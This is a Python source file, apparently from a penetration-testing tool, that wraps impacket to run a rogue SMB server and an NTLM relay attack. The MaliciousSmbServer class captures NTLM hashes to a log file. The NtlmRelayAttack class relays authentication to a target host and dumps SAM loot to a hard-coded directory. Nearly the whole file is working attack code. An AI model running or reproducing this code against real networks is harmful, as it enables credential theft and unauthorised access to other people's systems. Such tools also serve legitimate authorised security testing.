from impacket.smbserver import SimpleSMBServer
import logging
from loguru import logger
from .interceptlogging import InterceptHandlerOnlyFiles, InterceptHandlerStdout

from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
import contextlib
import sys


class MaliciousSmbServer(SimpleSMBServer):
    """[ Class that contains the configuration for the smbserver ]

    Args:
        lhost (str): [ ip of the host that will start the smb server ]
        port (str): [ port for the smb server ]
    """

    def __init__(self, lhost: str, port: str) -> None:
        super().__init__(listenAddress=lhost, listenPort=int(port))
        self.__lhost = lhost
        self.__port = port
        self.output_of_connections()

    @property
    def lhost(self) -> str:
        return self.__lhost

    @property
    def port(self) -> str:
        return self.__port

    @port.setter
    def port(self, port: str) -> None:
        self.__port = port

    @lhost.setter
    def lhost(self, lhost: str) -> None:
        self.__lhost = lhost

    def output_of_connections(self) -> None:
        logger.add(
            "logs/hashes_ntlm.log",
            level="INFO",
            rotation="1 week",
        )

    def start_malicious_smbserver(self) -> None:
        """[ Function to start the smb server ]"""
        logger.bind(name="info").info("Starting Malicious SMB Server ...")
        logging.basicConfig(handlers=[InterceptHandlerStdout()], level=0)
        super().setSMBChallenge("")
        super().start()


class NoOutput(object):
    def write(self, x):
        pass


class NtlmRelayAttack:
    def __init__(self, lhost: str, port: str, rhost: str, asynchronous: bool):
        self.__lhost = lhost
        self.__port = port
        self.__rhost = rhost
        self.__attacks = {"SMB": SMBAttack}
        self.__clients = {"SMB": SMBRelayClient}
        self.__asynchronous = asynchronous

    @property
    def lhost(self) -> str:
        return self.__lhost

    @property
    def port(self) -> str:
        return self.__port

    @property
    def rhost(self) -> str:
        return self.__rhost

    @property
    def attacks(self) -> dict:
        return self.__attacks

    @property
    def clients(self) -> dict:
        return self.__clients

    @property
    def asynchronous(self) -> bool:
        return self.__asynchronous

    @port.setter
    def port(self, port: str) -> None:
        self.__port = port

    @lhost.setter
    def lhost(self, lhost: str) -> None:
        self.__lhost = lhost

    @contextlib.contextmanager
    def no_stdout(self):
        save = sys.stdout
        sys.stdout = NoOutput()
        yield
        sys.stdout = save

    def start_ntlm_relay_server(self) -> None:
        if self.asynchronous:
            logging.basicConfig(handlers=[InterceptHandlerOnlyFiles()], level=0)
            logger.bind(name="info").debug("Starting ntlm-relay attack...")
        else:
            logging.basicConfig(handlers=[InterceptHandlerStdout()], level=0)
            logger.bind(name="info").info("Starting ntlm-relay attack...")

        target = TargetsProcessor(
            singleTarget=self.rhost,
            protocolClients=self.clients,
        )
        config = NTLMRelayxConfig()
        config.setMode("RELAY")
        config.target = target
        config.setAttacks(self.attacks)
        config.setProtocolClients(self.clients)
        config.setSMB2Support(True)
        config.setLootdir("/home/rsgbengi/Igris/project/ManInTheMiddle/sam")
        config.interfaceIp = self.lhost
        server = SMBRelayServer(config)
        server.daemon = True
        if self.__asynchronous:
            # with self.no_stdout():
            sys.stdout = NoOutput()
            server.start()
        else:
            server.start()
        server.join()
